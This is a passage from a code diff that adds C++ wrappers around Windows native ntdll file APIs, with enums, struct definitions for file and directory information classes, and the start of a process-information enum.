FileCaseSensitiveInformation = 71, FileLinkInformationEx = 72, FileLinkInformationExBypassAccessCheck = 73, FileStorageReserveIdInformation = 74, FileCaseSensitiveInformationForceAccessCheck = 75, FileKnownFolderInformation = 76, FileMaximumInformation = 77 };
+      enum class FILE_DISPOSITION { SUPERSEDE = 0x00000000, OPEN = 0x00000001, CREATE = 0x00000002, OPEN_IF = 0x00000003, OVERWRITE = 0x00000004, OVERWRITE_IF = 0x00000005 };
+      enum class FILE_OPTIONS { DIRECTORY_FILE = 0x00000001, WRITE_THROUGH = 0x00000002, SEQUENTIAL_ONLY = 0x00000004, NO_INTERMEDIATE_BUFFERING = 0x00000008, SYNCHRONOUS_IO_ALERT = 0x00000010, SYNCHRONOUS_IO_NONALERT = 0x00000020, NON_DIRECTORY_FILE = 0x00000040, CREATE_TREE_CONNECTION = 0x00000080, COMPLETE_IF_OPLOCKED = 0x00000100, NO_EA_KNOWLEDGE = 0x00000200, OPEN_REMOTE_INSTANCE = 0x00000400, RANDOM_ACCESS = 0x00000800, DELETE_ON_CLOSE = 0x00001000, OPEN_BY_ID = 0x00002000, OPEN_FOR_BACKUP_INTENT = 0x00004000, NO_COMPRESSION = 0x00008000, OPEN_REQUIRING_OPLOCK = 0x00010000, RESERVE_OPFILTER = 0x00100000, OPEN_REPARSE_POINT = 0x00200000, OPEN_NO_RECALL = 0x00400000, OPEN_FOR_FREE_SPACE_QUERY = 0x00800000 };
+      enum class FILE_RESULT { SUPERSEDED = 0x00000000, OPENED = 0x00000001, CREATED = 0x00000002, OVERWRITTEN = 0x00000003, EXISTS = 0x00000004, DOES_NOT_EXIST = 0x00000005 };
+      enum class FILE_ATTRIBUTES { READONLY = 0x00000001, HIDDEN = 0x00000002, SYSTEM = 0x00000004, DIRECTORY = 0x00000010, ARCHIVE = 0x00000020, DEVICE = 0x00000040, NORMAL = 0x00000080, TEMPORARY = 0x00000100, SPARSE_FILE = 0x00000200, REPARSE_POINT = 0x00000400, COMPRESSED = 0x00000800, OFFLINE = 0x00001000, NOT_CONTENT_INDEXED = 0x00002000, ENCRYPTED = 0x00004000, INTEGRITY_STREAM = 0x00008000, VIRTUAL = 0x00010000, NO_SCRUB_DATA = 0x00020000, EA = 0x00040000, PINNED = 0x00080000, UNPINNED = 0x00100000, RECALL_ON_OPEN = 0x00040000, RECALL_ON_DATA_ACCESS = 0x00400000 };
+      enum class FILE_SHARE_ACCESS { SHARE_READ = 0x00000001, SHARE_WRITE = 0x00000002, SHARE_DELETE = 0x00000004 };
+      
+      struct IO_STATUS_BLOCK_FILE { union { NTSTATUS Status; PVOID Pointer; }; FILE_RESULT Information; };
+   
+      struct NtFile : public NTObj< NtFile >
+      {
+      public:
+         const IO_STATUS_BLOCK_FILE io;
+
+         template<typename ...REST>
+         NtFile(HANDLE* h, ACCESS_MASK , OBJECT_ATTRIBUTES*, IO_STATUS_BLOCK* ioblock, REST ... rest) : NTObj{ h }, io{ *( (IO_STATUS_BLOCK_FILE*) ioblock) } {}
+
+         static auto make(
+            params p,
+            IO_STATUS_BLOCK* IoStatusBlock = NULL,
+            LARGE_INTEGER* AllocationSize = NULL,
+            FILE_ATTRIBUTES FileAttributes = FILE_ATTRIBUTES::NORMAL,
+            FILE_SHARE_ACCESS ShareAccess = ( FILE_SHARE_ACCESS::SHARE_READ | FILE_SHARE_ACCESS::SHARE_WRITE | FILE_SHARE_ACCESS::SHARE_DELETE ),
+            FILE_DISPOSITION CreateDisposition = FILE_DISPOSITION::OPEN_IF,
+            FILE_OPTIONS CreateOptions = FILE_OPTIONS::SYNCHRONOUS_IO_NONALERT ,
+            void* EaBuffer = NULL,
+            ULONG EaLength = 0)
+         {
+            IO_STATUS_BLOCK_FILE io;
+            return NTObj< NtFile >::make< "NtCreateFile", IO_STATUS_BLOCK*, LARGE_INTEGER*, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG >(
+               p,
+               (IoStatusBlock ? IoStatusBlock : ( (IO_STATUS_BLOCK*) &io) ),
+               AllocationSize,
+               static_cast< ULONG >( FileAttributes ),
+               static_cast< ULONG >( ShareAccess ),
+               static_cast< ULONG >( CreateDisposition ),
+               static_cast< ULONG >( CreateOptions ),
+               EaBuffer,
+               EaLength
+               );
+         } 
+
+         
+         template< FILE_INFORMATION_CLASS > struct FILE_INFO_CLASS;
+#define MAP_EXISTING_FILE_INFO( KEY , TYPE   ) template<> struct FILE_INFO_CLASS< FILE_INFORMATION_CLASS::KEY > { using type = TYPE; }; 
+#define MAP_FILE_INFO( KEY , TYPE , CONTENT ) struct TYPE { CONTENT }; template<> struct FILE_INFO_CLASS< FILE_INFORMATION_CLASS::KEY > { using type = TYPE; }; 
+         MAP_FILE_INFO( FileAccessInformation , FILE_ACCESS_INFORMATION , ULONG AccessFlags; )
+         MAP_FILE_INFO( FileAlignmentInformation, FILE_ALIGNMENT_INFORMATION, ULONG AlignmentRequirement; )
+         MAP_FILE_INFO( FileAllocationInformation, FILE_ALLOCATION_INFORMATION, union _LARGE_INTEGER AllocationSize; )
+         MAP_FILE_INFO( FileAttributeTagInformation, FILE_ATTRIBUTE_TAG_INFORMATION, ULONG FileAttributes; ULONG ReparseTag;  )
+         MAP_FILE_INFO( FileBasicInformation, FILE_BASIC_INFORMATION, union _LARGE_INTEGER CreationTime; union _LARGE_INTEGER LastAccessTime; union _LARGE_INTEGER LastWriteTime; union _LARGE_INTEGER ChangeTime; ULONG FileAttributes; )
+         MAP_FILE_INFO( FileCaseSensitiveInformation, FILE_CASE_SENSITIVE_INFORMATION, ULONG Flags;)
+         MAP_FILE_INFO( FileCompletionInformation, FILE_COMPLETION_INFORMATION, PVOID Port; PVOID Key;)
+         MAP_FILE_INFO( FileCompressionInformation, FILE_COMPRESSION_INFORMATION, union _LARGE_INTEGER CompressedFileSize; USHORT CompressionFormat; UCHAR CompressionUnitShift; UCHAR ChunkShift; UCHAR ClusterShift; UCHAR Reserved[3];)
+         MAP_FILE_INFO( FileDesiredStorageClassInformation, FILE_DESIRED_STORAGE_CLASS_INFORMATION, enum _FILE_STORAGE_TIER_CLASS Class; ULONG Flags;)
+         MAP_FILE_INFO( FileDispositionInformation, FILE_DISPOSITION_INFORMATION, UCHAR DeleteFile;)
+         MAP_FILE_INFO( FileDispositionInformationEx, FILE_DISPOSITION_INFORMATION_EX, ULONG Flags;)
+         MAP_FILE_INFO( FileEaInformation, FILE_EA_INFORMATION, ULONG EaSize;)
+         MAP_FILE_INFO( FileEndOfFileInformation, FILE_END_OF_FILE_INFORMATION, union _LARGE_INTEGER EndOfFile;)
+         MAP_FILE_INFO( FileFullEaInformation, FILE_FULL_EA_INFORMATION, ULONG NextEntryOffset; UCHAR Flags; UCHAR EaNameLength; USHORT EaValueLength; CHAR EaName[1];)
+         MAP_FILE_INFO( FileIdGlobalTxDirectoryInformation, FILE_ID_GLOBAL_TX_DIR_INFORMATION, ULONG NextEntryOffset; ULONG FileIndex; union _LARGE_INTEGER CreationTime; union _LARGE_INTEGER LastAccessTime; union _LARGE_INTEGER LastWriteTime; union _LARGE_INTEGER ChangeTime; union _LARGE_INTEGER EndOfFile; union _LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; union _LARGE_INTEGER FileId; struct _GUID LockingTransactionId; ULONG TxInfoFlags; WCHAR FileName[1];)
+         MAP_FILE_INFO( FileIdInformation, FILE_ID_INFORMATION, ULONG64 VolumeSerialNumber; struct _FILE_ID_128 FileId;)
+         MAP_FILE_INFO( FileInternalInformation, FILE_INTERNAL_INFORMATION, union _LARGE_INTEGER IndexNumber;)
+         MAP_FILE_INFO( FileIoStatusBlockRangeInformation, FILE_IOSTATUSBLOCK_RANGE_INFORMATION, PUCHAR IoStatusBlockRange; ULONG Length;)
+         MAP_FILE_INFO( FileIoCompletionNotificationInformation, FILE_IO_COMPLETION_INFORMATION, PVOID KeyContext; PVOID ApcContext; struct IO_STATUS_BLOCK* IoStatusBlock;)
+         MAP_FILE_INFO( FileIoPriorityHintInformation, FILE_IO_PRIORITY_HINT_INFORMATION, enum _IO_PRIORITY_HINT PriorityHint;)
+         MAP_FILE_INFO( FileIsRemoteDeviceInformation, FILE_IS_REMOTE_DEVICE_INFORMATION, UCHAR IsRemote;)
+         MAP_FILE_INFO( FileLinkInformation,  FILE_LINK_INFORMATION, UCHAR ReplaceIfExists; ULONG Flags; PVOID RootDirectory; ULONG FileNameLength; WCHAR FileName[1];)
+         MAP_FILE_INFO( FileMailslotQueryInformation , FILE_MAILSLOT_QUERY_INFORMATION, ULONG MaximumMessageSize; ULONG MailslotQuota; ULONG NextMessageSize; ULONG MessagesAvailable; union _LARGE_INTEGER ReadTimeout;)
+         MAP_FILE_INFO( FileMailslotSetInformation,  FILE_MAILSLOT_SET_INFORMATION, union _LARGE_INTEGER* ReadTimeout; )
+         MAP_FILE_INFO( FileModeInformation   , FILE_MODE_INFORMATION, ULONG Mode;)
+         MAP_FILE_INFO( FileMoveClusterInformation, FILE_MOVE_CLUSTER_INFORMATION, ULONG ClusterCount; PVOID RootDirectory; ULONG FileNameLength; WCHAR FileName[1];)
+         MAP_FILE_INFO( FileNameInformation, FILE_NAME_INFORMATION, ULONG FileNameLength; WCHAR FileName[1];)
+         MAP_FILE_INFO( FileNetworkOpenInformation , FILE_NETWORK_OPEN_INFORMATION, union _LARGE_INTEGER CreationTime; union _LARGE_INTEGER LastAccessTime; union _LARGE_INTEGER LastWriteTime; union _LARGE_INTEGER ChangeTime; union _LARGE_INTEGER AllocationSize; union _LARGE_INTEGER EndOfFile; ULONG FileAttributes;)
+         MAP_FILE_INFO( FileNetworkPhysicalNameInformation, FILE_NETWORK_PHYSICAL_NAME_INFORMATION, ULONG FileNameLength; WCHAR FileName[1];)
+         MAP_FILE_INFO( FileNumaNodeInformation, FILE_NUMA_NODE_INFORMATION, USHORT NodeNumber;)
+         MAP_FILE_INFO( FileObjectIdInformation, FILE_OBJECTID_INFORMATION, LONG64 FileReference; UCHAR ObjectId[16]; UCHAR BirthVolumeId[16]; UCHAR BirthObjectId[16]; UCHAR DomainId[16]; UCHAR ExtendedInfo[48];)
+         MAP_FILE_INFO( FilePipeInformation, FILE_PIPE_INFORMATION, ULONG ReadMode; ULONG CompletionMode;)
+         MAP_FILE_INFO( FilePipeLocalInformation, FILE_PIPE_LOCAL_INFORMATION, ULONG NamedPipeType; ULONG NamedPipeConfiguration; ULONG MaximumInstances; ULONG CurrentInstances; ULONG InboundQuota; ULONG ReadDataAvailable; ULONG OutboundQuota; ULONG WriteQuotaAvailable; ULONG NamedPipeState; ULONG NamedPipeEnd;)
+         MAP_FILE_INFO( FilePipeRemoteInformation, FILE_PIPE_REMOTE_INFORMATION, union _LARGE_INTEGER CollectDataTime; ULONG MaximumCollectionCount;)
+         MAP_FILE_INFO( FilePositionInformation, FILE_POSITION_INFORMATION, union _LARGE_INTEGER CurrentByteOffset;)
+         MAP_FILE_INFO( FileProcessIdsUsingFileInformation, FILE_PROCESS_IDS_USING_FILE_INFORMATION, ULONG NumberOfProcessIdsInList; ULONG64 ProcessIdList[1];)
+         MAP_FILE_INFO( FileQuotaInformation, FILE_QUOTA_INFORMATION, ULONG NextEntryOffset; ULONG SidLength; union _LARGE_INTEGER ChangeTime; union _LARGE_INTEGER QuotaUsed; union _LARGE_INTEGER QuotaThreshold; union _LARGE_INTEGER QuotaLimit; struct _SID Sid;)
+         MAP_FILE_INFO( FileRenameInformation, FILE_RENAME_INFORMATION, UCHAR ReplaceIfExists; ULONG Flags; PVOID RootDirectory; ULONG FileNameLength; WCHAR FileName[1];)
+         MAP_FILE_INFO( FileReparsePointInformation, FILE_REPARSE_POINT_INFORMATION, LONG64 FileReference; ULONG Tag;)
+         MAP_FILE_INFO( FileSfioReserveInformation , FILE_SFIO_RESERVE_INFORMATION, ULONG RequestsPerPeriod; ULONG Period; UCHAR RetryFailures; UCHAR Discardable; ULONG RequestSize; ULONG NumOutstandingRequests;)
+         MAP_FILE_INFO( FileSfioVolumeInformation, FILE_SFIO_VOLUME_INFORMATION, ULONG MaximumRequestsPerPeriod; ULONG MinimumPeriod; ULONG MinimumTransferSize;)
+         MAP_FILE_INFO( FileStandardInformation, FILE_STANDARD_INFORMATION, union _LARGE_INTEGER AllocationSize; union _LARGE_INTEGER EndOfFile; ULONG NumberOfLinks; bool DeletePending; bool Directory;)
+         MAP_FILE_INFO( FileStandardLinkInformation, FILE_STANDARD_LINK_INFORMATION, ULONG NumberOfAccessibleLinks; ULONG TotalNumberOfLinks; UCHAR DeletePending; UCHAR Directory;)
+         MAP_FILE_INFO( FileStatInformation, FILE_STAT_INFORMATION, union _LARGE_INTEGER FileId; union _LARGE_INTEGER CreationTime; union _LARGE_INTEGER LastAccessTime; union _LARGE_INTEGER LastWriteTime; union _LARGE_INTEGER ChangeTime; union _LARGE_INTEGER AllocationSize; union _LARGE_INTEGER EndOfFile; ULONG FileAttributes; ULONG ReparseTag; ULONG NumberOfLinks; ULONG EffectiveAccess;)
+         MAP_FILE_INFO( FileStatLxInformation, FILE_STAT_LX_INFORMATION, union _LARGE_INTEGER FileId; union _LARGE_INTEGER CreationTime; union _LARGE_INTEGER LastAccessTime; union _LARGE_INTEGER LastWriteTime; union _LARGE_INTEGER ChangeTime; union _LARGE_INTEGER AllocationSize; union _LARGE_INTEGER EndOfFile; ULONG FileAttributes; ULONG ReparseTag; ULONG NumberOfLinks; ULONG EffectiveAccess; ULONG LxFlags; ULONG LxUid; ULONG LxGid; ULONG LxMode; ULONG LxDeviceIdMajor; ULONG LxDeviceIdMinor;)
+         MAP_FILE_INFO( FileStreamInformation, FILE_STREAM_INFORMATION, ULONG NextEntryOffset; ULONG StreamNameLength; union _LARGE_INTEGER StreamSize; union _LARGE_INTEGER StreamAllocationSize; WCHAR StreamName[1];)
+         MAP_FILE_INFO( FileTrackingInformation, FILE_TRACKING_INFORMATION, PVOID DestinationFile; ULONG ObjectInformationLength; CHAR ObjectInformation[1];)
+         MAP_FILE_INFO( FileValidDataLengthInformation, FILE_VALID_DATA_LENGTH_INFORMATION, union _LARGE_INTEGER ValidDataLength;)
+         MAP_FILE_INFO( FileVolumeNameInformation, FILE_VOLUME_NAME_INFORMATION, ULONG DeviceNameLength; WCHAR DeviceName[1];)
+         MAP_EXISTING_FILE_INFO( FileShortNameInformation,  FILE_NAME_INFORMATION  )
+         MAP_FILE_INFO( FileRemoteProtocolInformation,  FILE_REMOTE_PROTOCOL_INFORMATION, USHORT StructureVersion; USHORT StructureSize; ULONG Protocol; USHORT ProtocolMajorVersion; USHORT ProtocolMinorVersion; USHORT ProtocolRevision; USHORT Reserved; ULONG Flags; struct { ULONG Reserved[8]; } GenericReserved; struct { ULONG Reserved[16]; } ProtocolSpecificReserved; )
+         MAP_EXISTING_FILE_INFO( FileAlternateNameInformation,  FILE_NAME_INFORMATION )
+         MAP_FILE_INFO( FileNormalizedNameInformation, FILE_NORMALIZED_NAME_INFORMATION, ULONG FileNameLength; WCHAR FileName[1]; )
+         struct  _FILE_LINK_ENTRY_INFORMATION { ULONG NextEntryOffset; LONG64 ParentFileId; ULONG FileNameLength; WCHAR FileName[1]; };
+         MAP_FILE_INFO( FileHardLinkInformation, FILE_LINKS_INFORMATION, ULONG BytesNeeded; ULONG EntriesReturned; struct _FILE_LINK_ENTRY_INFORMATION Entry; )
+         MAP_FILE_INFO( FileAllInformation, FILE_ALL_INFORMATION, struct FILE_BASIC_INFORMATION BasicInformation; struct FILE_STANDARD_INFORMATION StandardInformation; struct FILE_INTERNAL_INFORMATION InternalInformation; struct FILE_EA_INFORMATION EaInformation; struct FILE_ACCESS_INFORMATION AccessInformation; struct FILE_POSITION_INFORMATION PositionInformation; struct FILE_MODE_INFORMATION ModeInformation; struct FILE_ALIGNMENT_INFORMATION AlignmentInformation; struct FILE_NAME_INFORMATION NameInformation;)
+         MAP_EXISTING_FILE_INFO( FileRenameInformationBypassAccessCheck, FILE_RENAME_INFORMATION  )
+         MAP_EXISTING_FILE_INFO( FileLinkInformationBypassAccessCheck, FILE_LINK_INFORMATION )
+         MAP_EXISTING_FILE_INFO( FileReplaceCompletionInformation, FILE_COMPLETION_INFORMATION )
+         MAP_FILE_INFO(FileHardLinkFullIdInformation, FILE_LINK_ENTRY_FULL_ID_INFORMATION, ULONG NextEntryOffset; struct _FILE_ID_128 ParentFileId; ULONG FileNameLength; WCHAR FileName[1]; )
+         MAP_EXISTING_FILE_INFO( FileRenameInformationEx, FILE_RENAME_INFORMATION  )
+         MAP_EXISTING_FILE_INFO( FileRenameInformationExBypassAccessCheck, FILE_RENAME_INFORMATION  )
+         MAP_FILE_INFO( FileMemoryPartitionInformation, FILE_MEMORY_PARTITION_INFORMATION, ULONG_PTR OwnerPartitionHandle; union { struct { UCHAR NoCrossPartitionAccess; UCHAR Spare[3]; } DUMMYSTRUCTNAME; ULONG AllFlags; } Flags; )
+         MAP_FILE_INFO( FileLinkInformationEx, FILE_LINK_INFORMATION_EX, union { BOOLEAN ReplaceIfExists; ULONG Flags; }; HANDLE RootDirectory; ULONG FileNameLength; WCHAR FileName[1]; )
+         MAP_EXISTING_FILE_INFO( FileLinkInformationExBypassAccessCheck, FILE_LINK_INFORMATION_EX  )
+         enum class STORAGE_RESERVE_ID { StorageReserveIdNone = 0, StorageReserveIdHard, StorageReserveIdSoft, StorageReserveIdUpdateScratch, StorageReserveIdMax };
+         MAP_FILE_INFO(FileStorageReserveIdInformation, FILE_STORAGE_RESERVE_ID_INFORMATION, STORAGE_RESERVE_ID StorageReserveId;)
+         MAP_EXISTING_FILE_INFO( FileCaseSensitiveInformationForceAccessCheck, FILE_CASE_SENSITIVE_INFORMATION )
+         enum class FILE_KNOWN_FOLDER_TYPE { KnownFolderNone, KnownFolderDesktop, KnownFolderDocuments, KnownFolderDownloads, KnownFolderMusic, KnownFolderPictures, KnownFolderVideos, KnownFolderOther, KnownFolderMax }  ;
+         MAP_FILE_INFO( FileKnownFolderInformation, FILE_KNOWN_FOLDER_INFORMATION,  FILE_KNOWN_FOLDER_TYPE Type;)
+  
+         IMPORTAPI(L"ntdll.dll", NtSetInformationFile, NTSTATUS, HANDLE FileHandle, IO_STATUS_BLOCK* IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
+         auto setInformationFile( IO_STATUS_BLOCK* IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass ) {
+            THROW_ON_ERR( NtSetInformationFile( getHandle(), IoStatusBlock, FileInformation, Length, FileInformationClass ) );
+            return true;
+         }
+ 
+         IMPORTAPI(L"ntdll.dll", NtQueryInformationFile, NTSTATUS, HANDLE FileHandle, IO_STATUS_BLOCK* IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
+         auto queryInformationFile( IO_STATUS_BLOCK* IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass) {
+            THROW_ON_ERR( NtQueryInformationFile( getHandle(), IoStatusBlock, FileInformation, Length, FileInformationClass ) );
+            return true;
+         }
+         template< FILE_INFORMATION_CLASS infoClass  >
+         auto queryInformationFile() {
+            typename FILE_INFO_CLASS< infoClass >::type buff{ 0x00 };
+            IO_STATUS_BLOCK io{ 0x00 };
+            queryInformationFile( &io, &buff, sizeof(buff), infoClass );
+            return buff;
+         }
+
+         IMPORTAPI(L"ntdll.dll", NtQueryDirectoryFile, NTSTATUS, HANDLE FileHandle, HANDLE Event, IO_APC_ROUTINE* ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_DIRECTORY_INFO_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)
+         auto queryInformationDirectory(HANDLE Event, IO_APC_ROUTINE* ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_DIRECTORY_INFO_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
+            return NtQueryDirectoryFile(getHandle(), Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+         }
+         template <FILE_DIRECTORY_INFO_CLASS> struct DIR_INFO_CLASS;
+#define MAP_DIR_INFO( KEY , TYPE , CONTENT ) struct TYPE { CONTENT }; template<> struct DIR_INFO_CLASS< FILE_DIRECTORY_INFO_CLASS::KEY > { using type = TYPE; }; 
+         MAP_DIR_INFO( FileDirectoryInformation,         FILE_DIRECTORY_INFORMATION,   ULONG NextEntryOffset; ULONG FileIndex; union _LARGE_INTEGER CreationTime; union _LARGE_INTEGER LastAccessTime; union _LARGE_INTEGER LastWriteTime; union _LARGE_INTEGER ChangeTime; union _LARGE_INTEGER EndOfFile; union _LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; WCHAR FileName[1]; )
+         MAP_DIR_INFO( FileFullDirectoryInformation,     FILE_FULL_DIR_INFORMATION,    ULONG NextEntryOffset; ULONG FileIndex; union _LARGE_INTEGER CreationTime; union _LARGE_INTEGER LastAccessTime; union _LARGE_INTEGER LastWriteTime; union _LARGE_INTEGER ChangeTime; union _LARGE_INTEGER EndOfFile; union _LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; ULONG EaSize; WCHAR FileName[1]; )
+         MAP_DIR_INFO( FileBothDirectoryInformation,     FILE_BOTH_DIR_INFORMATION,    ULONG NextEntryOffset; ULONG FileIndex; union _LARGE_INTEGER CreationTime; union _LARGE_INTEGER LastAccessTime; union _LARGE_INTEGER LastWriteTime; union _LARGE_INTEGER ChangeTime; union _LARGE_INTEGER EndOfFile; union _LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; ULONG EaSize; CHAR ShortNameLength; WCHAR ShortName[12]; WCHAR FileName[1];)
+         MAP_DIR_INFO( FileNamesInformation,             FILE_NAMES_INFORMATION,       ULONG NextEntryOffset; ULONG FileIndex; ULONG FileNameLength; WCHAR FileName[1];)
+         MAP_DIR_INFO( FileIdBothDirectoryInformation,   FILE_ID_BOTH_DIR_INFORMATION, ULONG NextEntryOffset; ULONG FileIndex; union _LARGE_INTEGER CreationTime; union _LARGE_INTEGER LastAccessTime; union _LARGE_INTEGER LastWriteTime; union _LARGE_INTEGER ChangeTime; union _LARGE_INTEGER EndOfFile; union _LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; ULONG EaSize; CHAR ShortNameLength; WCHAR ShortName[12]; union _LARGE_INTEGER FileId; WCHAR FileName[1]; )
+         MAP_DIR_INFO( FileIdFullDirectoryInformation,   FILE_ID_FULL_DIR_INFORMATION, ULONG NextEntryOffset; ULONG FileIndex; union _LARGE_INTEGER CreationTime; union _LARGE_INTEGER LastAccessTime; union _LARGE_INTEGER LastWriteTime; union _LARGE_INTEGER ChangeTime; union _LARGE_INTEGER EndOfFile; union _LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; ULONG EaSize; union _LARGE_INTEGER FileId; WCHAR FileName[1];)
+         MAP_DIR_INFO( FileIdExtdDirectoryInformation,   FILE_ID_EXTD_DIR_INFORMATION, ULONG NextEntryOffset; ULONG FileIndex; union _LARGE_INTEGER CreationTime; union _LARGE_INTEGER LastAccessTime; union _LARGE_INTEGER LastWriteTime; union _LARGE_INTEGER ChangeTime; union _LARGE_INTEGER EndOfFile; union _LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; ULONG EaSize; ULONG ReparsePointTag; struct _FILE_ID_128 FileId; WCHAR FileName[1]; )
+   
+         template<typename T>
+         struct DIR_ENTRY { wstring name; T info; };
+         template< typename T > DIR_ENTRY( wstring, T )->DIR_ENTRY< T >;
+
+         template< FILE_DIRECTORY_INFO_CLASS infoClass, typename buf_type = DIR_INFO_CLASS< infoClass >::type >
+         auto queryInformationDirectory() 
+         {
+            std::vector< DIR_ENTRY<buf_type> > content;
+            vector<unsigned char> buf{ 0x00 };  
+            buf.reserve(0xff00);
+            buf_type* dirbuf = (buf_type*)&buf[0];
+           
+            bool first_iteration = TRUE;
+            buf_type* entry = dirbuf;
+
+            for (;; entry) {
+               IO_STATUS_BLOCK io{ 0x00 };
+               if ( ! NT_SUCCESS( queryInformationDirectory( NULL, NULL, 0, &io, (void*)dirbuf, buf.size(), infoClass, false, NULL, first_iteration) ) ) break;
+               entry = dirbuf;
+               for (;;)
+               {
+                  wstring fname{ entry->FileName, entry->FileNameLength / 2 };
+                  if (fname != L"." && fname != L".." && fname.length() != 0 ){ 
+                     content.emplace_back( DIR_ENTRY{ fname , *entry } );
+                  }
+                  if( entry->NextEntryOffset == 0 ) return content;
+                  entry = (buf_type*)(((char*)entry) + entry->NextEntryOffset);
+               }
+               first_iteration = FALSE;
+            }
+            return content;
+         } 
+         IMPORTAPI(L"ntdll.dll", NtReadFile, NTSTATUS, HANDLE FileHandle, HANDLE Event, IO_APC_ROUTINE* ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, PVOID Buffer, ULONG Length, LARGE_INTEGER* ByteOffset, ULONG* Key);
+         auto readFile(HANDLE Event, IO_APC_ROUTINE* ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, PVOID Buffer, ULONG Length, LARGE_INTEGER* ByteOffset,  ULONG* Key) {
+            auto ret = NtReadFile(getHandle(), Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);
+            THROW_ON_ERR(ret);
+            return ret;
+         }
+         auto readAllOfFile() {
+            auto size = queryInformationFile<FILE_INFORMATION_CLASS::FileStandardInformation>().EndOfFile;
+            IO_STATUS_BLOCK io;
+            std::vector<  char> data;
+            data.resize( size.QuadPart );
+            readFile(nullptr, nullptr, nullptr, &io, ((void*) &data[0]), static_cast<ULONG>( size.QuadPart ), { 0 }, nullptr);
+            return  str{ &data[0], data.size() };
+         }
+         IMPORTAPI(L"ntdll.dll", NtWriteFile, NTSTATUS, HANDLE FileHandle, HANDLE Event, IO_APC_ROUTINE* ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, PVOID Buffer, ULONG Length, LARGE_INTEGER* ByteOffset, ULONG* Key);
+         auto writeFile( HANDLE Event, IO_APC_ROUTINE* ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, PVOID Buffer, ULONG Length, LARGE_INTEGER* ByteOffset, ULONG* Key ) {
+            auto ret = NtWriteFile( getHandle(), Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);
+            THROW_ON_ERR(ret);
+            return ret;
+         }
+         void writeAllData( vector<unsigned char> data ) {
+            IO_STATUS_BLOCK io; 
+            writeFile(nullptr, nullptr, nullptr, &io, ((void*)&data[0]), data.size(), { 0 }, nullptr);
+         }
+      };
+   }
+   using namespace files;
+   namespace process
+   {
+      struct CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; };
+
+      struct PROCESS_DEVICEMAP_INFORMATION { HANDLE DirectoryHandle; };
+      enum PROCESSINFOCLASS { ProcessBasicInformation = 0, ProcessQuotaLimits = 1, ProcessIoCounters = 2, ProcessVmCounters = 3, ProcessTimes = 4, ProcessBasePriority = 5, ProcessRaisePriority = 6, ProcessDebugPort = 7, ProcessExceptionPort = 8, ProcessAccessToken = 9, ProcessLdtInformation = 10, ProcessLdtSize = 11, ProcessDefaultHardErrorMode = 12, ProcessIoPortHandlers = 13, ProcessPooledUsageAndLimits = 14, ProcessWorkingSetWatch = 15, ProcessUserModeIOPL = 16, ProcessEnableAlignmentFaultFixup = 17, ProcessPriorityClass = 18, ProcessWx86Information = 19, ProcessHandleCount = 20, ProcessAffinityMask = 21, ProcessPriorityBoost = 22, ProcessDeviceMap = 23, ProcessSessionInformation = 24, ProcessForegroundInformation = 25, ProcessWow64Information = 26, ProcessImageFileName = 27, ProcessLUIDDeviceMapsEnabled = 28, ProcessBreakOnTermination = 29, ProcessDebugObjectHandle = 30, ProcessDebugFlags = 31, ProcessHandleTracing = 32, ProcessIoPriority = 33, ProcessExecuteFlags = 34, ProcessTlsInformation = 35, ProcessCookie = 36, ProcessImageInformation = 37, ProcessCycleTime = 38, ProcessPagePriority = 39, ProcessInstrumentationCallback = 40, ProcessThreadStackAllocation = 41, ProcessWorkingSetWatchEx = 42, ProcessImageFileNameWin32 = 43, ProcessImageFileMapping = 44, ProcessAffinityUpdateMode = 45, ProcessMemoryAllocationMode = 46, ProcessGroupInformation = 47, ProcessTokenVirtualizationEnabled = 48, ProcessOwnerInformation = 49, ProcessWindowInformation = 50, ProcessHandleInformation = 51, ProcessMitigationPolicy = 52, ProcessDynamicFunctionTableInformation = 53, ProcessHandleCheckingMode = 54, ProcessKeepAliveCount = 55, ProcessRevokeFileHandles = 56, ProcessWorkingSetControl = 57, ProcessHandleTable = 58, ProcessCheckStackExtentsMode = 59, ProcessCommandLineInformation = 60, ProcessProtectionInformation = 61, ProcessMemoryExhaustion = 62, ProcessFaultInformation = 63, ProcessTelemetryIdInformation = 64, ProcessCommitReleaseInformation = 65, ProcessDefaultCpuSetsInformation = 66, ProcessAllowedCpuSetsInformation = 67, ProcessReserved1Information = 66, ProcessReserved2Information = 67, ProcessSubsystemProcess = 68, ProcessJobMemoryInformation = 69, ProcessInPrivate = 70, ProcessRaiseUMExceptionOnInvalidHandleClose = 71, ProcessIumChallengeResponse = 72, ProcessChildProcessInformation = 73, ProcessHighGraphicsPriorityInformation = 74, ProcessSubsystemInformation = 75, ProcessEnergyValues = 76, 